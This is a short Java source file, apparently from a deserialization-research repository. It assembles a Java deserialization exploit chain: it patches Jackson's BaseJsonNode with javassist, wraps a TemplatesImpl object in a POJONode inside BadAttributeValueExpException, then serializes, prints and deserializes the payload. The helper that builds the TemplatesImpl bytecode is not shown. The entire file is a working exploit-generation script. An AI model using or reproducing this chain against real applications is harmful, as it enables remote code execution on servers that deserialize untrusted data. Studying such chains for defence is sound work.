package com.jdkunser;

import com.example.Utils;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;

public class TemplatesImplChain {
    public static void main(String[] args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        TemplatesImpl obj = Utils.getTemplatesImpl();

        POJONode pojonode = new POJONode(obj);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Utils.SetValue(badAttributeValueExpException, "val", pojonode);

        String barr = Utils.Serialize(badAttributeValueExpException);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }
}